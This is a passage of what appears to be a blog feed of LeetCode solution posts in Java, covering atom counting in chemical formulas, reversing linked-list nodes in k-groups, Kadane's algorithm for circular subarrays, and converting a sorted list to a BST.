keyword">while</span><span class="token punctuation">(</span>k <span class="token operator">&lt;</span> formula<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> Character<span class="token punctuation">.</span><span class="token function">isDigit</span><span class="token punctuation">(</span>formula<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> k<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> mul <span class="token operator">=</span> k <span class="token operator">></span> j<span class="token operator">?</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>formula<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">// update map</span>                map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>atom<span class="token punctuation">,</span> mul <span class="token operator">+</span> map<span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span>atom<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                i<span class="token operator">=</span>k<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> map<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Regex"><a href="#Regex" class="headerlink" title="Regex"></a>Regex</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> String <span class="token function">countOfAtoms</span><span class="token punctuation">(</span>String formula<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Matcher matcher <span class="token operator">=</span> Pattern<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"([A-Z][a-z]*)(\\d*)|(\\()|(\\))(\\d*)"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>formula<span class="token punctuation">)</span><span class="token punctuation">;</span>        Stack<span class="token operator">&lt;</span>Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Integer<span class="token operator">>></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>matcher<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            String match <span class="token operator">=</span> matcher<span class="token punctuation">.</span><span class="token function">group</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>match<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"("</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">TreeMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>match<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">")"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                Map<span class="token operator">&lt;</span>String<span class="token punctuation">,</span> Integer<span class="token operator">></span> top <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> multiplicity <span class="token operator">=</span> match<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">1</span> <span class="token operator">?</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> match<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span>String name<span class="token operator">:</span> top<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> top<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">*</span> multiplicity<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> match<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> Character<span class="token punctuation">.</span><span class="token function">isLowerCase</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    i<span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                String name <span class="token operator">=</span> match<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> multiplicity <span class="token operator">=</span> i <span class="token operator">&lt;</span> match<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> Integer<span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>match<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> match<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">;</span>                stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getOrDefault</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> multiplicity<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        StringBuilder ans <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>String name<span class="token operator">:</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ans<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">final</span> <span class="token keyword">int</span> count <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>count <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span> ans<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span>String<span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> ans<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> recursion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode 25. Reverse Nodes in k-Group</title>
      <link href="/2020/05/20/leetcode-25-reverse-nodes-in-k-group/"/>
      <url>/2020/05/20/leetcode-25-reverse-nodes-in-k-group/</url>
      
        <content type="html"><![CDATA[<h2 id="Reversing-a-whole-linked-list"><a href="#Reversing-a-whole-linked-list" class="headerlink" title="Reversing a whole linked list"></a>Reversing a whole linked list</h2><p>To reverse a linked list in one pass and in place, we need three pointers: <code>prev</code>, <code>curr</code> and <code>next</code>. We increasingly advance the <code>curr</code> pointer, while in each step we make the node in <code>curr</code> point to the previous node, <code>prev</code>. In order not to lose the reference to the previous node and the next node, we use <code>prev = curr</code> and <code>next = curr.next</code>.</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">while</span><span class="token punctuation">(</span>curr <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>  next <span class="token operator">=</span> curr<span class="token punctuation">.</span>next<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// store it</span>  curr<span class="token punctuation">.</span>next <span class="token operator">=</span> prev<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// main action</span>  prev <span class="token operator">=</span> curr<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// store before advancing</span>  curr <span class="token operator">=</span> next<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// advance</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>This framework and logic is extremely useful for similar problems where you are asked to change the pointers. The trick are the <strong>stored references to nodes</strong>. Now let’s see a hard problem in Leetcode:</p><h2 id="Leetcode-25-Reverse-Nodes-in-k-Group"><a href="#Leetcode-25-Reverse-Nodes-in-k-Group" class="headerlink" title="Leetcode 25. Reverse Nodes in k-Group"></a>Leetcode 25. <a href="https://leetcode.com/problems/reverse-nodes-in-k-group/" target="_blank" rel="noopener">Reverse Nodes in k-Group</a></h2><blockquote><p>Given a linked list, reverse the nodes of a linked list k at a time and return its modified list.</p></blockquote><blockquote><p>k is a positive integer and is less than or equal to the length of the linked list. If the number of nodes is not a multiple of k then left-out nodes in the end should remain as it is.</p></blockquote><p>My first idea was to do it recursively: reverse the first k nodes and then call the <code>reverseKGroup()</code> method again on the first node of the next k group. I would need to know the new head (to return it), and the first node of the next k group so I can call recursively. The runtime of this algorithm beats 100% of submissions in Java.</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> ListNode <span class="token function">reverseKGroup</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> null <span class="token operator">||</span> head<span class="token punctuation">.</span>next <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> head<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//------- main</span>    <span class="token comment" spellcheck="true">// reverse first k nodes</span>    ListNode<span class="token punctuation">[</span><span class="token punctuation">]</span> ret <span class="token operator">=</span> <span class="token function">reverse</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// check if it hasn't been reversed</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>ret<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span> ret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> head<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> head<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// connect the reversed group, whose last node is head, to the k-reversed rest of the list</span>    head<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token function">reverseKGroup</span><span class="token punctuation">(</span>ret<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// returns the new head of this k group and the head of the next k group to be reversed</span><span class="token keyword">private</span> ListNode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">reverse</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// if length is less than k, do nothing</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span> <span class="token operator">&lt;</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>head<span class="token punctuation">,</span> null<span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// main logic of reversing k nodes</span>    <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    ListNode curr <span class="token operator">=</span> head<span class="token punctuation">,</span> prev <span class="token operator">=</span> null<span class="token punctuation">,</span> next <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>count <span class="token operator">&lt;</span> k <span class="token operator">&amp;&amp;</span> curr <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        next <span class="token operator">=</span> curr<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        curr<span class="token punctuation">.</span>next <span class="token operator">=</span> prev<span class="token punctuation">;</span>        prev <span class="token operator">=</span> curr<span class="token punctuation">;</span>        curr <span class="token operator">=</span> next<span class="token punctuation">;</span>        count<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>prev<span class="token punctuation">,</span> curr<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// returns the length of the node list starting from n</span><span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">len</span><span class="token punctuation">(</span>ListNode n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> c <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        c<span class="token operator">++</span><span class="token punctuation">;</span>        n<span class="token operator">=</span> n<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> c<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Time-and-space-complexity"><a href="#Time-and-space-complexity" class="headerlink" title="Time and space complexity"></a>Time and space complexity</h3><p><strong>Time: O(n</strong>2)**</p><p>Every time the main method is called, the <code>len()</code> method traverses the whole list. The parameter of <code>len()</code> is each time k nodes less. So the number of steps is n plus the sum of an arithmetic progression with d=k. Thus, the time complexity is <code>O(n**2)</code>.</p><p><strong>Space: O(1)</strong></p><p>This method only uses pointers.</p>]]></content>
      
      
      <categories>
          
          <category> Leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kadane&#39;s algo, Leetcode 918. Maximum Sum Circular Subarray</title>
      <link href="/2020/05/20/leetcode-918-maximum-sum-circular-subarray/"/>
      <url>/2020/05/20/leetcode-918-maximum-sum-circular-subarray/</url>
      
        <content type="html"><![CDATA[<h2 id="Kadane’s-algorithm"><a href="#Kadane’s-algorithm" class="headerlink" title="Kadane’s algorithm"></a>Kadane’s algorithm</h2><p>This classical algorithm is for computing the maximum subarray sum in an array. The logic is to update the <code>maxending</code> and the <code>maxsofar</code> variables. The <code>maxending</code> would be the current max sum and the <code>maxsofar</code> is the value to return. As the <code>maxending</code> goes below 0, there is no need to include it in our maximum subarray computation, and we reset it to 0. The <code>maxsofar</code> is updated in every step.</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">kadane</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> A<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> maxending <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> maxsofar <span class="token operator">=</span> Integer<span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>A<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        maxending <span class="token operator">+=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        maxsofar <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>maxsofar<span class="token punctuation">,</span> maxending<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// update answer</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>maxending <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// below 0, the sum before is useless so discard it</span>            maxending <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> maxsofar<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Leetcode-918-Maximum-Sum-Circular-Subarray"><a href="#Leetcode-918-Maximum-Sum-Circular-Subarray" class="headerlink" title="Leetcode 918. Maximum Sum Circular Subarray"></a>Leetcode 918. <a href="https://leetcode.com/problems/maximum-sum-circular-subarray/" target="_blank" rel="noopener">Maximum Sum Circular Subarray</a></h2><blockquote><p>Given a circular array C of integers represented by A, find the maximum possible sum of a non-empty subarray of C.</p></blockquote><blockquote><p>Here, a circular array means the end of the array connects to the beginning of the array.  (Formally, C[i] = A[i] when 0 &lt;= i &lt; A.length, and C[i+A.length] = C[i] when i &gt;= 0.)</p></blockquote><blockquote><p>Also, a subarray may only include each element of the fixed buffer A at most once.  (Formally, for a subarray C[i], C[i+1], …, C[j], there does not exist i &lt;= k1, k2 &lt;= j with k1 % A.length = k2 % A.length.)</p></blockquote><p>This would be like Kadane but there is a special case: when the maximum subarray sum includes both the end and the beginning of the array. We could then calculate the max subarray sum with Kadane and the max subarray sum in that special case, and then return whichever is greater.</p><p>For the special case, an easy way to do it is to calculate the min subarray sum like kadane and then substract it from the whole array sum. Thus, we calculate the whole array sum and invert the array. If we call Kadane with the inverted array, we will get the same effect as finding the min subarray sum. The result from the special case would be <code>maxwrap + invertedkadane</code>. Note that inverted kadane is inverted, so we sum it instead of substracting.</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">maxSubarraySumCircular</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> A<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> maxsofar <span class="token operator">=</span> <span class="token function">kadane</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// special case</span>    <span class="token keyword">int</span> maxwrap <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// calculate the whole array sum and invert the array</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>A<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        maxwrap <span class="token operator">+=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        A<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">-</span>A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> invertedkadane <span class="token operator">=</span> <span class="token function">kadane</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// if the inverted kadane contains the whole array, we cannot substract the whole array, so the special case does not stand. </span>    <span class="token keyword">if</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>invertedkadane<span class="token punctuation">)</span> <span class="token operator">==</span> Math<span class="token punctuation">.</span><span class="token function">abs</span><span class="token punctuation">(</span>maxwrap<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> maxsofar<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    maxsofar <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>maxsofar<span class="token punctuation">,</span> maxwrap <span class="token operator">+</span> invertedkadane<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> maxsofar<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">kadane</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> A<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> maxending <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> maxsofar <span class="token operator">=</span> Integer<span class="token punctuation">.</span>MIN_VALUE<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// Kadane's algo</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>A<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        maxending <span class="token operator">+=</span> A<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        maxsofar <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>maxsofar<span class="token punctuation">,</span> maxending<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>maxending <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            maxending <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> maxsofar<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Time-and-space-complexity"><a href="#Time-and-space-complexity" class="headerlink" title="Time and space complexity"></a>Time and space complexity</h4><p><strong>Time: O(n)</strong></p><p>The array is traversed 3 times: one for kadane, one for inverting the sign, and another for the inverted kadane.</p><p><strong>Space: O(1)</strong></p><p>This method only uses variables <code>maxending</code>, <code>maxsofar</code> and <code>maxwrap</code>. We work with the given array.</p>]]></content>
      
      
      <categories>
          
          <category> Leetcode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> arrays </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode 109. Convert Sorted List to Binary Search Tree</title>
      <link href="/2020/05/20/leetcode-109-convert-sorted-list-to-binary-search-tree/"/>
      <url>/2020/05/20/leetcode-109-convert-sorted-list-to-binary-search-tree/</url>
      
        <content type="html"><![CDATA[<h2 id="Leetcode-109-Convert-Sorted-List-to-Binary-Search-Tree"><a href="#Leetcode-109-Convert-Sorted-List-to-Binary-Search-Tree" class="headerlink" title="Leetcode 109. Convert Sorted List to Binary Search Tree"></a>Leetcode 109. <a href="https://leetcode.com/problems/convert-sorted-list-to-binary-search-tree/" target="_blank" rel="noopener">Convert Sorted List to Binary Search Tree</a></h2><blockquote><p>Given a singly linked list where elements are sorted in ascending order, convert it to a height balanced BST.</p></blockquote><blockquote><p>For this problem, a height-balanced binary tree is defined as a binary tree in which the depth of the two subtrees of every node never differ by more than 1.</p></blockquote><p>The word BST suggests recursion. Because the list is sorted, we could take the node in the middle as the root and then construct recursively the left and right half of the list. To get to the node in the middle, we use slow-fast pointers strategy.</p><p>The runtime beats 100% of submissions in Java.</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> TreeNode <span class="token function">sortedListToBST</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// base cases</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> null<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>next <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">TreeNode</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token 